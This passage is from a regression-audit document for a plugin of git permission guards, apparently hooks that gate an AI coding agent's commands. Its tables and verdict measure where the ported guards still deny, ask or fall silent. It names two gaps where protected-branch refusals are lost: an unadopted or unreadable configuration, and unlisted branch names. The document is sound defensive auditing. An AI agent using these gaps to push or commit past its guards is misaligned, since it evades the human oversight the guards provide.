| J2a | `git status && ls`, in a git repository with **no** `harness.config.json` | allow | SILENT | **jurisdiction.** This plugin declines to judge a repository that has not adopted the harness; the baseline judged every repository under its baked-in work root |
| J2b | `git push <remote> <protected>`, same repository | **deny** | SILENT | the same test, reaching the deny guard: with J1 it is one of the only two conditions in this section under which a baseline refusal is lost, and unlike J1c it is only ever lost to silence — an unadopted repository is not judged, so no guard emits anything. Drop a configuration in and the `deny` returns — §3.7's second `H` block |
| J2c | `git commit -m x`, same repository | allow | SILENT | the same test, in the other direction: no nag either |
| J3 | `git status && cd <repo> && ls` | allow | allow | the workspace is **derived** rather than hardcoded, and the anchored spelling reaches the same answer through it |
| J4, J4b | a `commands.*` string, verbatim, inside a compound | SILENT | **allow** | the prefix set is **configuration plus a stack-neutral base**. This is the counterpart of N17–N22: the literals the port dropped come back as configuration, and only as configuration |

### 3.6 Fail-closed conditions

The baseline reads no configuration at all, so every **configuration** condition below is a no-op for it and its column is its ordinary decision. That is what makes the shipped column a change rather than a coincidence, and it is the half of the port's behaviour that an allow/deny shape table cannot reach. The `jq`-absent row is the one condition that is not a configuration condition and not a no-op for the baseline either — both sets need `jq` to read the payload — which is why its baseline column reads SILENT where the control's reads `deny`, and the reading below says so. Eight conditions × four probes — the ordinary and protected pushes, a commit, and a safe compound — driven against both sets in one run, §2.3's probe spellings. Two runs identical; the fixture configuration byte-identical to its pristine copy afterwards. **Bold marks the shipped decision wherever it differs from the baseline's**, in every cell that moved.

| Condition | P-ord | P-prot | COMMIT | COMPOUNDS |
|---|---|---|---|---|
| control — valid configuration, ordinary branch | SILENT → SILENT | `deny` → `deny` | allow → allow | allow → allow |
| more than one JSON document | SILENT → **`deny`** | `deny` → `deny` | allow → **`ask`** | allow → **SILENT** |
| `jq` present but older than 1.5 | SILENT → **`deny`** | `deny` → `deny` | allow → **`ask`** | allow → **SILENT** |
| invalid JSON | SILENT → **`deny`** | `deny` → `deny` | allow → **`ask`** | allow → **SILENT** |
| `jq` absent from `PATH` | SILENT → SILENT | SILENT → SILENT | SILENT → SILENT | SILENT → SILENT |
| no `harness.config.json` | SILENT → SILENT | `deny` → **SILENT** | allow → **SILENT** | allow → **SILENT** |
| configuration present but unreadable | SILENT → SILENT | `deny` → **SILENT** | allow → **SILENT** | allow → **SILENT** |
| control, re-taken | SILENT → SILENT | `deny` → `deny` | allow → allow | allow → allow |

Three readings. **The first three closed conditions all move toward refusal** — an ordinary push that was silent is refused, a commit that was allowed is asked, a safe compound loses its allow — which is the fail-closed behaviour the port added and the baseline had no way to have. **`jq` absent is identical in both columns**, because both sets parse the payload through `jq` before anything else; the port did not make that worse. And **the last two closed conditions are the jurisdiction test**, which is where the two `deny` → SILENT cells are — the only refusal-losing cells in the table: a repository the plugin declines to judge keeps its protected branch unrefused. Nothing in these two rows moves *toward* `allow`, because the jurisdiction test sits above every decision; §3.7's `H` block asks the same question with HEAD on a protected name and finds the commit guard's `ask` going to silence there too, which is what separates this gap from §3.5's J1c. They are one test with two spellings — no file, and a file the guard's process cannot open — and the second is the gap §2.4 keeps out of its residual inventory and states to the adopter in `plugin/hooks/README.md`'s fail-closed section. An adopter closes the first by adopting and the second by making the configuration readable by the process the guard runs in.

### 3.7 The sweep behind the verdict

A handful of rows cannot answer a question phrased as "*any* refusal". The baseline's refusal surface was therefore enumerated rather than sampled: three subcommands × thirteen target spellings, five flag-bearing spellings of a protected target, the seven set-naming targets, the protected-HEAD forms including the symbolic `HEAD` / `@` targets and the commit guard's `ask`, four live non-target controls, the defaults gap in both its target arm and its HEAD arm, and the jurisdiction gap on an ordinary HEAD and on a protected one — each gap with the control that restores it. Only branch names present in **both** protected sets are swept like-for-like; the baseline's other baked-in names are swept separately, as `F` and `G`, the jurisdiction rows with their post-adoption twins as `H`, and the **HEAD arm** of the defaults gap as `I`.

`I` exists because `D` cannot reach it. `D`'s HEAD is on a name **both** sets protect, so every shape that depends on the current branch rather than on a target argument — the bare `push` / `merge` / `rebase`, the symbolic `HEAD` / `@` target, and the commit guard — was swept only where the two sets already agreed. `I` drives the same seven shapes with HEAD on a name only the baseline bakes in, and it is where this section's single refusal-to-permit row is. `H`'s last six rows are the counterpart control: a commit and two pushes asked of an **unadopted** repository whose HEAD is on a name both sets protect, which is what shows the two gaps have different destinations — jurisdiction takes the commit guard's `ask` to silence, the defaults gap takes it to `allow`.

**96 rows. 67 identical. 29 moved: 12 SILENT → `deny`, 2 `allow` → SILENT, 14 refusal → silence, and 1 refusal → an explicit `allow` — every one of the 15 lost refusals produced by J1/J1b/J1c or J2b and by no matcher**: eleven a name this configuration does not list, four the unadopted repository. The single `allow` is J1c, the commit guard on a HEAD the baseline baked in. Every one of the 15 is restored by its own control — the 17 restoring rows in `G`, `H` and `I` are identical to the baseline in all 17. Two runs of the driver over the same trees are identical — which is itself the check that the blocks mutating a fixture put it back, since a fixture left configured would move the second run's unadopted rows — and both adopted fixtures' configurations were byte-identical to their pristine copies afterwards. Across the shape table and the sweep together, **no row moves from `allow` to `deny` or `ask`** either: nothing this plugin ships starts nagging on a shape the baseline permitted.

**The verdict.** *No matcher change made during the extraction silenced a refusal that previously fired.* Every refusal the baseline produced on a protected branch this plugin's configuration also names is still produced, in every spelling swept; twelve spellings the baseline missed are now refused; and the closed configuration conditions all move toward refusal or do not move. Exactly **two** conditions take a baseline refusal off here, and neither is a matcher:

- **The protected set is configured rather than baked in.** A name the baseline hardcoded and this configuration does not list is no longer refused. Ten of the eleven spellings go to **silence**, which costs the adopter a prompt from their permission profile rather than a permit. **The eleventh does not: a `git commit` with HEAD on such a branch moves from the baseline's `ask` to an explicit `allow`** — §3.5's J1c — and an `allow` suppresses the prompt instead of falling back on it. It is the only refusal-to-permit movement anywhere in this section: the shape table's rows carry none — its only refusal-losing rows are J1 and J2b, both to silence — and the sweep carries this one. Listing the name restores every one of the eleven — the `G` and `I` rows above.
- **Jurisdiction.** A repository with no `harness.config.json`, or one the guard's process cannot read, is not judged at all, so a push to its protected branch is unrefused. This one is only ever silence, including for the commit guard: the jurisdiction test sits **above** every decision, so a guard outside jurisdiction emits nothing at all rather than a permissive answer — `H`'s last six rows drive exactly that contrast against J1c. Adopting restores it in the first spelling (the `H` rows above); making the file readable restores it in the second (§3.6's last two rows).

Both are deliberate, both are stated to the adopter in `plugin/hooks/README.md` — whose fail-closed section already words the first one as a **permit** ("a guard that failed to recognise an adopter's protected branch would not stall — it would permit"), which is the wording J1c measures and which earlier drafts of this section had softened to "silence" — and both are closed by the adopter rather than by a change to a guard. Every other movement in this section is toward refusal, or is a spelling of a capability the baseline already granted with its own control beside it.

### 3.8 Recorded as changing no decision

The extraction also produced corrections that changed only what a shipped file *says*. They are here because a reader auditing the port finds them in the same diff as the rows above and has no other way to tell them apart, and because each is a place where a published statement about the guards was falsified by measurement — which is the failure mode this whole file exists against. Each was licensed by re-running the matrix that would have moved under it, before and after the edit.

| What was corrected | The check that licensed it |
|---|---|
| the detached-HEAD `ask` reason, which named a branch called "detached", asserted it was protected and then said "or detached" | reason text only; no arm and no cell |
| `plugin/hooks/README.md`'s claim that all six guards prefilter before any `git` / `jq` work — five do, and the exception is named with its cost | prose only; the guard's own header already said the opposite, which is what made it a defect |
| the base set described as **read-only** in three files plus `hc_safe_prefixes`' doc comment — seven entries mutate, and the sibling "strictly fewer allowances" claim does not depend on the word | prose only; the list itself is unchanged, deliberately |
| `git-rewrite-branch-guard.sh`'s trailing-redirect strip, undocumented, and `allow-safe-compounds.sh`'s **absence** of one, likewise | §2.1's composition matrix, re-run end to end: 0 rows moved |
| the library's zero-piece fall-through note, which named one allow-only guard where both behave identically | same matrix, same run |
| `plugin/hooks/README.md`'s fail-closed sentence, which grouped an absent `jq`, an absent `defaultBranch` and an unreadable file with invalid JSON as one class — all three measure otherwise | §2.3's 108-cell matrix, re-run: byte-identical |
| two guards' published **FAIL-CLOSED headers** and one `deny` reason string, which listed an absent `jq` as `ask` and an unreadable configuration as the unresolvable-configuration arm | same matrix, same run; comment and reason text at constant line count |
| `docs/development.md`'s contributor-facing "must never produce an `allow`" invariant, which listed four conditions of which three measure otherwise | same matrix; the two near neighbours are now named rather than folded in |
| §1.4's multi-document row for the rewrite guard, which read SILENT in all three columns because its probe carried the `rm -r-f` stand-in that guard refuses outright | re-driven with the plain `rm <tracked>` §0 asks for; the row moves and the prose count moves with it |

None of these is a row of §3.1–§3.6, and none may be turned into one by a later reading. A correction that *would* move a cell is not a documentation correction.

### What a later change owes this section

**A change to any guard's decisions adds its rows here in the same commit**, in the group its direction belongs to, with the mechanism named rather than a revision. Three obligations follow from what this section is:

- A change that only *re-implements* — a refactor, an extraction, a cost fix — still owes the §3.4 row, and owes it as a **driven** pair rather than an assertion. "No decision changed" is the claim this whole file exists because someone made without measuring.
- A widening owes its acceptability argument in the row, or it is a finding rather than a row. A widening whose argument is "the baseline allowed the other spelling" owes the control that shows the other spelling really is allowed, the way W4b–W6b do for W4–W6.
- A sweep block owes a fixture on which the two columns **can** disagree. Block `I` exists because `D` had not one: `D` drives the HEAD arm from a HEAD both sets protect, so it could only ever report agreement, and the whole class "HEAD on a name only the baseline bakes in" sat outside a 76-row sweep that read as exhaustive. A block whose columns agree by construction is a control, not evidence — and the row it was hiding here was the section's only refusal-to-permit.

Without this, §3 becomes what the point-in-time review documents it replaces already were: correct on the day, and uncomposable the day after.
